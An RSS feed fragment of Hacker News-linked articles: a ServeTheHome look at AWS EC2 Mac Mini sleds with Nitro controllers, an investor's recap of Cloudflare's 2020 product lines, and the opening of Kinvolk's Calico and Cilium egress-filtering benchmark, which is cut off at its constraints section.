<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dolthub.com/blog/2020-12-28-join-planning/">https://www.dolthub.com/blog/2020-12-28-join-planning/</a></em></p>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-12-28-join-planning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561173</guid>
            <pubDate>Mon, 28 Dec 2020 17:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How AWS Added Apple Mac Mini Nodes to EC2]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 206 (<a href="https://news.ycombinator.com/item?id=25561127">thread link</a>) | @tambourine_man
<br/>
December 28, 2020 | https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover.jpg" data-caption="AWS EC2 Apple Mac Mini Node In Rack Cover"><img width="696" height="449" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-696x449.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-696x449.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-400x258.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-651x420.jpg 651w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="AWS EC2 Apple Mac Mini Node In Rack Cover" title="AWS EC2 Apple Mac Mini Node In Rack Cover"></a><figcaption>AWS EC2 Apple Mac Mini Node In Rack Cover</figcaption></figure></div>
            <!-- content --><p>Since this is a holiday week, and we tend to do a bit more fun content. I wanted to take a look at how Amazon AWS is adding Apple Mac Mini nodes to EC2. We recently covered the announcement in <a href="https://www.servethehome.com/amazon-aws-ec2-mac-mini-powered-macos-cloud-instances-launched/">Amazon AWS EC2 Mac Mini Powered MacOS Instances Launched</a>, but now we have some pictures of the solution.<span id="more-49658"></span></p>
<h2>How AWS Added Apple Mac Mini Nodes to EC2</h2>
<p>This is what an x86/ 10GbE Apple Mac Mini looks like in an EC2 rack. One can see that the unit is placed in a sled. Around the Mac Mini are a surprising number of wires being routed through the chassis.</p>
<figure id="attachment_49661" aria-describedby="caption-attachment-49661"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack/" rel="attachment wp-att-49661"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack" width="1253" height="638" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg 1253w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-400x204.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-800x407.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-696x354.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-1068x544.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-825x420.jpg 825w" sizes="(max-width: 1253px) 100vw, 1253px"></a><figcaption id="caption-attachment-49661">AWS EC2 Apple Mac Mini Node In Rack</figcaption></figure>
<p>Many of these wires terminate at the front of the sled. Here, we have an AWS Nitro controller. Amazon is now on its fourth generation of Nitro controller after starting the journey years ago.</p>
<figure id="attachment_49659" aria-describedby="caption-attachment-49659"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-nitro-to-nitro4/" rel="attachment wp-att-49659"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg" alt="AWS Nitro To Nitro4" width="2560" height="688" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg 2560w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-400x107.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-800x215.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1536x413.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-2048x550.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-696x187.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1068x287.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1564x420.jpg 1564w" sizes="(max-width: 2560px) 100vw, 2560px"></a><figcaption id="caption-attachment-49659">AWS Nitro To Nitro4</figcaption></figure>
<p>We have covered this a number of times, but Nitro is effectively what the industry is trying to replicate (and expand upon) as part of the push towards DPUs. If you are not familiar with DPUs, check out our <a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">What is a DPU A Data Processing Unit Quick Primer</a> and video:</p>
<p><iframe title="What is a DPU - A Quick STH Primer to the New Processor" width="696" height="392" src="https://www.youtube.com/embed/S92rdAwIuNk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>On the front of the AWS Mac Mini sled, there is the Nitro controller. There are two <a href="https://www.servethehome.com/exclusive-gigabyte-annapurna-labs-arm-storage-server-benchmarks/">Annapurna Labs</a> branded chips, one with what looks like five DRAM packages atop the PCB and one without. There is a red cable atop the Nitro PCB that almost looks like a standard SATA cable with a 90-degree connector.</p>
<figure id="attachment_49660" aria-describedby="caption-attachment-49660"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack-nitro-controller-highlighted/" rel="attachment wp-att-49660"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack Nitro Controller Highlighted" width="1355" height="609" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted.jpg 1355w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-400x180.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-800x360.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-696x313.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-1068x480.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-934x420.jpg 934w" sizes="(max-width: 1355px) 100vw, 1355px"></a><figcaption id="caption-attachment-49660">AWS EC2 Apple Mac Mini Node In Rack Nitro Controller Highlighted</figcaption></figure>
<p>AWS says it is using Thunderbolt to connect to the Mac Mini. Although most logos are covered up in AWS’s screenshot, we can see what appears to be (logo partially covered by a white label) a black Belkin Thunderbolt 3 cable on the bottom of the Nitro controller. Amazon said it is using Thunderbolt to connect its Nitro controller to the Mac Mini and provide its basic suite of EBS storage, networking, and security/ management features.</p>
<h2>Final Words</h2>
<p>Something important to keep in mind here is that the Mac Mini itself is a relatively lower cost versus the rest of AWS’s infrastructure to host the node versus many of AWS’s other EC2 offerings. It is also much more complex than something like a <a href="https://www.servethehome.com/myelectronics-nl-apple-mac-mini-and-raspberry-pi-rack-review/">Mac in a Rack</a> setup that we recently featured on STH.</p>
<p><iframe title="Rackmount Apple Mac Mini and Raspberry Pi" width="696" height="392" src="https://www.youtube.com/embed/t__DW0NbJIs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Overall, the big takeaway for our readers should be the impact of the AWS Nitro and why the industry is pushing so hard on DPUs right now. AWS is effectively using its Nitro controller as the endpoint so it can abstract the nodes it is putting on its network. Instead of having to re:Invent (yes that was purposeful) a new Mac OS stack, it could leverage Nitro and deliver its services over Thunderbolt. Some of the Thunderbolt changes in the M1 generation also may partially explain why AWS is using the older x86 nodes instead of newer M1 Arm nodes.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561127</guid>
            <pubDate>Mon, 28 Dec 2020 17:35:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Flare Ups: It's Been a Busy 2020 for Cloudflare]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560918">thread link</a>) | @StriverGuy
<br/>
December 28, 2020 | https://hhhypergrowth.com/flare-ups/ | <a href="https://web.archive.org/web/*/https://hhhypergrowth.com/flare-ups/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<section>
<div>
<p>It has been a busy 2020 for Cloudflare. This company is my 2nd highest position (right behind CrowdStrike) as it sits at the nexus of two of the next-gen enterprise technology waves that I follow closely - <strong><a href="https://hhhypergrowth.com/tag/edge-networks/">Edge Networks</a></strong> and<strong> <a href="https://hhhypergrowth.com/tag/cybersecurity/">Zero Trust</a></strong>. Over the second half of 2020, it has had 4 different announcement weeks: Serverless Week, Birthday Week, Zero Trust Week, and Privacy &amp; Compliance Week. They are continually moving forward at an incredibly rapid pace, and while these announcement weeks are great for seeing the product innovations, it also gives us outsiders a view into <strong>how these moves fit into the larger picture</strong>. </p><p>And whoooo-boy... were there a lot of announcements. So many that it may look like they are moving in too many directions, or seem scattered or are stretching themselves thin. But no - <em>every</em> advance Cloudflare makes is improving either their core platform (web protection and performance), or one of the key directions I am watching them move more fully into. Instead of going one-by-one through the new products and features, let's instead look at what Cloudflare had before, the key platform areas that I am watching as an investor, and how those areas advanced. </p><p>I'm going to be referencing their prior products heavily. Pop quiz: What is Magic Transit, Argo, WARP? You need to know... so let's recap their product lines &amp; features stood (at the start of summer) before we explore the new enhancements.</p><hr><figure><img src="https://hhhypergrowth.com/content/images/2020/12/cloudflare_logo.png" alt="" srcset="https://hhhypergrowth.com/content/images/size/w600/2020/12/cloudflare_logo.png 600w, https://hhhypergrowth.com/content/images/2020/12/cloudflare_logo.png 874w" sizes="(min-width: 720px) 720px"></figure><p>This is mostly a recap from my <a href="https://hhhypergrowth.com/a-cloudflare-deep-dive/">first deep dive back in February 2020</a>, with a couple of additions and clarifications.</p><h2 id="core-platform">Core platform</h2><p>Cloudflare is an edge network, currently with 51Tb+ of global network capacity that is interconnecting with nearly 9000 outside networks (ISPs, cloud providers, internet exchanges, and customers). Their edge network is generally accessed via 200 Points of Presence (POPs), strategically situated across 100 countries – putting the vast majority of the world within 100ms of their edge. They handle 18M+ web requests per second on average, hitting 25M+ protected web sites and services -- which means they typically handle ~1.5 trillion web requests a day. The insights gained from handling all that traffic then powers a threat intel system that protects the edge network and its customers, which blocks an average of 72B cyberthreats a day. </p><p>Behind the core architecture of their platform is:</p><ul><li>Software Defined Networking = Cloudflare architected their global network and backbones to be software-based, which allows for their entire edge network to be programmable. [Covered before in my <a href="https://hhhypergrowth.com/what-are-edge-networks/">Edge Networks</a> write up.]</li><li>Local Edge Routing ("Anycast") = Allows for incoming requests to the edge network to be routed to different locations; any edge server, instead of one origin server. This is what allows CDNs and edge networks to be a proxy, and provide an umbrella of services by sitting over all requests to origin servers.</li><li><a href="https://blog.cloudflare.com/argo-and-the-cloudflare-global-private-backbone/">Global Private Backbone ("Argo")</a> &nbsp;= Their private network backbones between major interconnects, which all combine into their global edge network. This allows them to efficiently monitor global network conditions, and to achieve higher speeds by routing traffic globally across those private backbones instead of over the public Internet (using Argo Smart Routing - see below). </li><li><a href="https://www.cloudflare.com/network/">Global Anycast Network</a> = Their mesh of global networks and backbones, with 200+ edge servers across the globe serving as gateways into that network. [You can see the list of POP cities in the link.] </li></ul><figure><img src="https://hhhypergrowth.com/content/images/2020/12/cloudflare_global.png" alt="" srcset="https://hhhypergrowth.com/content/images/size/w600/2020/12/cloudflare_global.png 600w, https://hhhypergrowth.com/content/images/size/w1000/2020/12/cloudflare_global.png 1000w, https://hhhypergrowth.com/content/images/2020/12/cloudflare_global.png 1500w" sizes="(min-width: 720px) 720px"><figcaption>Cloudflare's network of POPs forms a mesh covering 95% of the Internet-going populace.</figcaption></figure><p>Their edge network sits between a company's applications (web sites, web apps, or mobile apps) or services (APIs, microservices, or serverless), and the users making requests to them. Being a proxy between a <em>service</em> and the <em>users accessing it </em>has a lot of advantages, and the primary focus of Cloudflare over its first 10 years has been around 3 pillars: improving the <strong>Security</strong>, <strong>Performance</strong> and <strong>Reliability</strong> of their customers' web applications and services. &nbsp;</p><h3 id="security">Security</h3><p>Cloudflare is known mostly for its security features. Security over your web applications and services remains critical! Some tidbits from <a href="https://blog.cloudflare.com/network-layer-ddos-attack-trends-for-q3-2020/">a recent technical blog post looking at attack trends</a>: DDoS attacks are surging in 2020, and for the past 3 quarters, <strong>the number of attacks have doubled each of those quarters</strong>. </p><ul><li><a href="https://www.cloudflare.com/waf/">Web Application Firewall (WAF)</a> = A proactive next-gen firewall over your web application. Uses threat intelligence (ML &amp; signature recognition) and customizable rules to block suspicious traffic.</li><li><a href="https://www.cloudflare.com/ddos/">DDoS Protection</a> = Ensure performance of your web app or service, by making sure only legitimate traffic is hitting it. Prevents denial of service and concurrent bot attacks.</li><li><a href="https://www.cloudflare.com/products/bot-management/">Bot Management</a> = Stop automated bots in real-time, tracking both good or bad actors. Prevents common attack vectors, like application DDoS and content scraping.</li><li><a href="https://www.cloudflare.com/rate-limiting/">Rate Limiting</a> = Once traffic gets in through the WAF, provides rate limiting capabilities over your application, to curb application DDoS attacks, brute-force login attempts, and other abusive behaviors from "legitimate" requests.</li><li><a href="https://www.cloudflare.com/ssl/">SSL</a> = Provides SSL/HTTPS capabilities over your web application or service.</li><li><a href="https://www.cloudflare.com/products/cloudflare-spectrum/">Spectrum</a> = Extends these core security features to work with non-web protocols (email, FTP, SSH, MQTT, or any specialized TCP/UDP traffic, like game protocols).</li><li><a href="https://www.cloudflare.com/campaigns/">Cloudflare for Campaigns</a> = Free service protecting local, state and federal US political campaigns from attack (via DDoS and WAF).</li></ul><h3 id="performance">Performance</h3><p>Besides being a security layer, being the proxy between web services and end users also allows Cloudflare to help improve the performance of the application being called, so that it is as fast as possible. This is primarily through caching and optimization of content.</p><ul><li><a href="https://www.cloudflare.com/cdn">Content Delivery Network (CDN)</a> = Caching static content for faster delivery and greatly reduced trips to origin server.</li><li><a href="https://www.cloudflare.com/website-optimization/">Web Optimization</a> = Compressing content &amp; images for faster delivery. Automatically encode images to a variety of formats, allowing for right-sizing of images by tailoring it to the device it is viewed on (phone vs tablet vs web).</li><li><a href="https://www.cloudflare.com/products/cloudflare-stream/">Stream</a> (Video Optimization &amp; Delivery) = Compresses video for faster delivery and caches it to CDN. Automatically encodes to a variety of formats, allowing for right-sizing of video, to tailor to device it is viewed on (phone vs tablet vs web). Allows for limiting access based on geo-location, user or time-based rules.</li></ul><h3 id="reliability">Reliability</h3><p>And hand-in-hand with performance of your application comes the reliability of the entire network between a service and its users, to assure it is always available. Cloudflare provides an array of services to bolster the resilience of your site, and make sure the network there is always at the ready.</p><ul><li><a href="https://www.cloudflare.com/products/argo-smart-routing/">Argo Smart Routing</a> = Route optimization system to determine fastest route for web requests to origin. Detects real-time congestion via ML, and routes around it; think of it as the "Waze for the Internet". Finds the fastest &amp; most reliable routes over both the edge network backbone (Argo) and the overall Internet. </li><li><a href="https://www.cloudflare.com/load-balancing/">Load Balancing</a> = Allows for routing incoming Anycast requests to different origin servers, or have failover should a server go down. Allows for geo-steering, to assure certain regions of users hit a particular server.</li><li><a href="https://www.cloudflare.com/dns/">Managed DNS</a> = Fast, secure and resilient Domain Name Service (DNS, the lookup that routes URLs to the network IP that serves it). Built to be highly redundant, with built-in DDoS &amp; spoof protection.</li></ul><h2 id="consumers">Consumers</h2><p>Besides their core enterprise platform, they have several consumer-facing applications.... and like their enterprise platform, it has very generous options at the free tier. In particular, it is important to understand their WARP-line of products, which is a VPN that protects the endpoint's traffic to the nearest edge server. </p><ul><li><a href="https://1.1.1.1/dns/">1.1.1.1</a> = Free &amp; fast open DNS resolution service for consumers (the lookup to determine what IP to route a web request to). Similar to what Google provides as their Public DNS server at 8.8.8.8. &nbsp;[This <a href="https://blog.cloudflare.com/announcing-1111/">blog post</a> covered the history of DNS and its issues, if you want to understand DNS better.]</li><li><a href="https://1.1.1.1/family/">1.1.1.1 for Families</a> = Family-friendly public DNS resolution servers for use on home routers, for malware and adult content blocking.</li><li><a href="https://1.1.1.1/">1.1.1.1 + WARP</a> = Free consumer VPN app for mobile (iOS and Android), and, as of this year, Mac and Windows desktop. Beyond using the 1.1.1.1 DNS service, it is a VPN that <strong>protects the network traffic between your device and the nearest edge server</strong>.</li><li>WARP+ = Paid consumer VPN service in the 1.1.1.1 app, that extends WARP<strong> by adding in Argo Smart Routing over Cloudflare's private backbones</strong>, to achieve higher speeds on web requests (30% faster on average), and gain overall better performance &amp; reliability. This leverages their enterprise-focused edge network towards consumer use.</li></ul><p>Their consumer products don't provide revenue (they are free or low-cost), but provide clues as to where their enterprise products can go, plus assuredly provides a lot of intel in their routing &amp; threat detection analytics happening over network traffic. &nbsp;</p><h2 id="connectivity">Connectivity</h2><p>All of these are the enterprise flip-side of those consumer services - they protect the traffic between a company's enterprise network or specific origin servers to the nearest edge server. </p><ul><li><a href="https://www.cloudflare.com/products/argo-tunnel/">Argo Tunnel</a> = Secure tunneling for the edge to connect to individual web apps and services. It is a lightweight agent that runs on an origin server, <strong>creating a tunnel to the nearest edge server</strong>, so traffic can route in through Cloudflare's application security -- to then take advantage of WAF, DDoS protection, rate limiting, load balancing, etc. The request and response speeds are improved via Argo Smart Routing over their private backbones. [The agent is called "cloudflared", with the "d" for daemon (a service running the background). But it must be fun to say your service is "cloud-flared".]</li><li><a href="https://www.cloudflare.com/partners/peering-portal/">Private Network Interface (PNI) </a>= Network interconnect to an enterprise's network, via an interconnect partner (Data Center) or Internet exchange (IX). This …</li></ul></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hhhypergrowth.com/flare-ups/">https://hhhypergrowth.com/flare-ups/</a></em></p>]]>
            </description>
            <link>https://hhhypergrowth.com/flare-ups/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560918</guid>
            <pubDate>Mon, 28 Dec 2020 17:13:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Egress Filtering Benchmark Part 2: Calico and Cilium]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560912">thread link</a>) | @vbatts
<br/>
December 28, 2020 | https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/ | <a href="https://web.archive.org/web/*/https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>In a 


<a href="https://kinvolk.io/blog/2020/09/performance-benchmark-analysis-of-egress-filtering-on-linux/" target="_blank">recent blog
post</a>
, we
compared three different technical approaches to filtering egress traffic on Linux: IP tables, IP sets, and
BPF. While that provided some interesting baseline benchmarks of the core Linux technologies, we wanted to go
beyond that to look at how one would implement such filters in practice, using off-the-shelf cloud native
network policy solutions.</p>
<p>In the realm of the Cloud Native, it is not far-fetched to imagine a Kubernetes cluster needing egress
filtering for controlling the traffic (host or pod) attempting to leave the network to possibly wild and
dangerous endpoints on the internet. Indeed, this is a common use case for avoiding exfiltration of data by
malicious workloads.</p>
<p>One could of course build a custom egress filtering framework to suit the use case based on the existing
technologies in the Linux networking pipeline. Or one could take advantage of the Kubernetes CNI plugins that
already offer similar functionality.</p>
<p>Our friends at SAP asked us to perform a benchmark of the two most widely used Kubernetes CNIs, Calico and
Cilium, for this task. This blog post presents the methodology and results from benchmarking Calico and Cilium
deployed on a 


<a href="https://kinvolk.io/lokomotive-kubernetes/" target="_blank">Lokomotive</a>
 cluster.</p>
<h2 id="goals">Goals</h2>
<p>We had the following goals going into this study:</p>
<ul>
<li>Provide a reproducible benchmark framework that anyone can download and use.</li>
<li>Compare the scalability and potential performance overhead by Kubernetes CNI plugins such as Calico and
Cilium against using the underlying Linux filtering mechanisms (IP sets and eBPF, respectively).</li>
</ul>
<h2 id="about-calico">About Calico</h2>
<p>


<a href="https://www.projectcalico.org/" target="_blank">Calico</a>
 is the most popular open source CNI plugin for Kubernetes, according
to the recent 


<a href="https://www.datadoghq.com/container-report/" target="_blank">Datadog container survey</a>
. Calico not only
provides networking but also offers policy isolation for securing the Kubernetes cluster using advanced
ingress and egress policies.</p>
<p>Calico provides a choice of dataplane including a standard Linux networking dataplane (default), a pure Linux
eBPF dataplane and a Windows HNS dataplane.</p>
<h2 id="about-cilium">About Cilium</h2>
<p>


<a href="https://cilium.io/" target="_blank">Cilium</a>
, an increasingly popular open source Kubernetes CNI plugin, leverages eBPF to
address the networking challenges of container workloads such as scalability, security and visibility. Cilium
capabilities include identity-aware security, multi-cluster routing, transparent encryption, API-aware
visibility/filtering, and service-mesh acceleration.</p>
<h2 id="network-policies">Network Policies</h2>
<p>Kubernetes network policies are defined using the Kubernetes NetworkPolicy resource. However, Kubernetes
itself does not enforce network policies, and instead delegates their enforcement to the network plugins, in
our case Calico or Cilium.</p>
<p>Kubernetes NetworkPolicy resource is an application-centric construct i.e. it allows you to specify how a pod
is allowed to communicate with others Pods, Services, external Ingress or Egress traffic. However, it cannot
be used to enforce rules on a node or cluster level. Hence for egress filtering, we create network policies
using these CNI plugins’ custom APIs.</p>
<p>Calico provides its NetworkPolicy, GlobalNetworkPolicy and GlobalNetworkSet API objects which provide
additional features such as order, namespace scoped or cluster-wide enforcement of policies.</p>
<p>For Calico, we used GlobalNetworkSet API passing a  list of CIDRs that we want to deny egress to and then
reference the GlobalNetworkSet resource in the GlobalNetworkPolicy via label selectors.</p>
<p>Under the hood, this setup is similar to using IP sets for filtering egress traffic. Calico uses
GlobalNetworkSet to create IP sets and GlobalNetworkPolicy to update the iptables matching the IP set.</p>
<p>Cilium, on the other hand, uses eBPF as the underlying technology to enforce network policies. A Cilium agent
running on each host translates the network policy definitions to eBPF programs and eBPF maps and attaches
them to different eBPF hooks in the system. Network policy definitions are created with the help of
CiliumNetworkPolicy and CiliumClusterwideNetworkPolicy custom resources for namespace scoped and cluster-wide
network traffic respectively.</p>
<p>For Cilium, we used CiliumClusterwideNetworkPolicy API passing a list of CIDRs to deny egress and match the
policy using label selectors for both application workloads and network traffic on the host.</p>
<h2 id="metrics">Metrics</h2>
<p>Filtering network traffic could be a costly operation, especially if the number of rules to check is
considerably high — such as in millions (as is the case with a real-world scenario we are working on).
Throughput, CPU usage and latency must all be measured to provide a meaningful conclusion for the technologies
to be used.</p>
<p>We have used the following metrics to measure the performance of the filters:</p>
<ul>
<li>Throughput</li>
<li>CPU usage</li>
<li>Latency</li>
</ul>
<p>For a Kubernetes CNI an equally important metric is <code>Set-up time</code>. Since Calico/Cilium delegates the
responsibilities to the underlying technologies, we want to capture the time taken by the CNI plugin to
process the created API objects and enforce the network policies for egress filtering.</p>
<h2 id="scenario">Scenario</h2>
<p>The scenario for this test is, as in our



<a href="https://kinvolk.io/blog/2020/09/performance-benchmark-analysis-of-egress-filtering-on-linux/" target="_blank">previous</a>

egress filtering benchmark, composed of a client and a server computer that communicate through an IP network.
The egress filtering is performed on the client machine and there is no filtering performed on the server
side.</p>
<p>We test five possible mechanisms for doing the filtering:</p>
<ul>
<li>iptables, “raw” IP sets and tc-eBPF test application, as in the previous benchmark (retesting to ensure
consistency)</li>
<li>Calico and Cilium, in both cases running the client application in a pod in a Lokomotive Kubernetes cluster,
with the solution under test running as the Kubernetes CNI plug-in.</li>
</ul>
<p>In addition, for a baseline reference, we also ran the test without any filtering mechanism in place.</p>
<p>This is shown in the following diagram:</p>
<figure>
  <img src="https://kinvolk.io/media/2020-12-23-egress-filtering-with-calico-cilium/scenario.svg">
</figure>
<h2 id="benchmark-set-up">Benchmark Set-up</h2>
<p>As mentioned earlier, our set-up builds on the work of the existing framework.  Hence the software and
hardware profiles used to benchmark IP sets and tc-eBPF largely remain the same, except for the following
changes:</p>
<ul>
<li>Updated software versions for Flatcar, ipset, iperf and the Linux kernel.</li>
<li>Two Lokomotive clusters with one worker node to run the benchmarks, one each for Calico and Cilium.</li>
</ul>
<h3 id="hardware">Hardware</h3>
<p>To perform the test we used the following bare metal servers running on 


<a href="https://metal.equinix.com/" target="_blank">Equinix
Metal</a>
:</p>
<ul>
<li>2 machines as client and server machines for IP set and tc-eBPF filters.</li>
<li>2 machines for the Lokomotive cluster (1 controller, 1 worker) for benchmarking Calico.</li>
<li>2 machines for the Lokomotive cluster (1 controller, 1 worker) for benchmarking Cilium.</li>
</ul>
<p>The specifications of all the machines used were:</p>
<div><pre><code data-lang="shell">c2.medium.x86
1x AMD EPYC 7401P 24-Core Processor @ 2.0GHz
2x 120GB SSD
2x 480GB SSD
64GB RAM
2x 10Gbps
</code></pre></div><h3 id="software">Software</h3>
<p>Kubernetes is deployed using 


<a href="https://kinvolk.io/lokomotive-kubernetes/" target="_blank">Lokomotive</a>
. We used two separate
clusters for this benchmark, to isolate comparison of Calico and Cilium from interfering with each other.</p>
<h4 id="calico">Calico</h4>
<p>Calico offers a choice of dataplane options, including standard Linux networking (its default) and eBPF.
However, Calico’s eBPF dataplane doesn’t support host endpoints, which means that node-level egress filtering
is not possible with it. Hence, we use the default standard Linux networking dataplane for our tests.</p>
<h4 id="cilium">Cilium</h4>
<p>Cilium with its eBPF based dataplane is installed on Lokomotive using a 


<a href="https://github.com/kinvolk/lokomotive/blob/imran/cilium-instead-of-calico/assets/terraform-modules/bootkube/resources/charts/cilium.yaml" target="_blank">modified default
configuration</a>

to support our test scenario. The changes are as follows:</p>
<ul>
<li>Increase the number of entries in the endpoint policy map to the maximum limit allowed; i.e. 65536.</li>
<li>Enable host firewall for enforcing host network policies.</li>
<li>The network interface name on which the host firewall applies.</li>
</ul>
<h4 id="software-versions">Software Versions</h4>
<p>The exact versions of all the tools we used are:</p>
<ul>
<li>Flatcar Container Linux by Kinvolk Alpha (2705.0.0)</li>
<li>Linux kernel 5.9.11</li>
<li>iperf 3.6 (in a Docker container with the host network)</li>
<li>iptables v1.6.2</li>
<li>ipset v7.6, protocol version: 7</li>
<li>Lokomotive v0.5.0 for Calico; Cilium feature branch for installing Lokomotive with Cilium</li>
<li>Kubernetes v1.19.4</li>
<li>Calico v3.16.4</li>
<li>Cilium v1.9.0</li>
</ul>
<p>A minimal working configuration for deploying Lokomotive on Equinix Metal can be found



<a href="https://github.com/kinvolk/egress-filtering-benchmark/blob/master/lokomotive" target="_blank">here</a>
 and the
instructions are mentioned in the



<a href="https://github.com/kinvolk/egress-filtering-benchmark/blob/master/README.md" target="_blank">README.md</a>
.</p>
<h3 id="tests">Tests</h3>
<p>We used the following parameters for each of the tests:</p>
<ul>
<li>
<p>Throughput: The goal of this test is to maximize throughput, ignoring CPU consumption (i.e. CPU will
typically be saturated). Therefore, iperf3 was used with the bandwidth set to 10Gbps (equal to the network
interface adapter speed) and UDP Packet size set to 1470. Throughput is tested in Gbps; we have not measured
throughput in packet per second (pps) but that could be added in the benchmark framework
(see 


<a href="https://github.com/kinvolk/egress-filtering-benchmark/issues/16" target="_blank">issue #16</a>
).</p>
</li>
<li>
<p>CPU usage: In this test we want to see the variation in CPU usage for a given throughout. Therefore, we
again use iperf3 but reduce the bandwidth to 1G. UDP Packet size remains at 1470.</p>
</li>
<li>
<p>Latency: To test latency, we bombard the server with ICMP packets using the ping utility at a rate of 1000
pings per millisecond.</p>
</li>
<li>
<p>Setup Time: As we discussed in our first egress filtering benchmark, set-up time is an implementation-detail
specific to the benchmarking application and most certainly can be improved upon. Setup time for Calico and
Cilium is calculated using ‘ping’ (ICMP) on a polling basis, checking the enforcement of policies on each
poll.</p>
</li>
</ul>
<h3 id="reproducibility">Reproducibility</h3>
<p>All the tools and instructions to reproduce these tests are provided in the GitHub repository



<a href="https://github.com/kinvolk/egress-filtering-benchmark" target="_blank">github.com/kinvolk/egress-filtering-benchmark
</a>
</p>
<h3 id="constraints">Constraints</h3>
<ul>
<li>
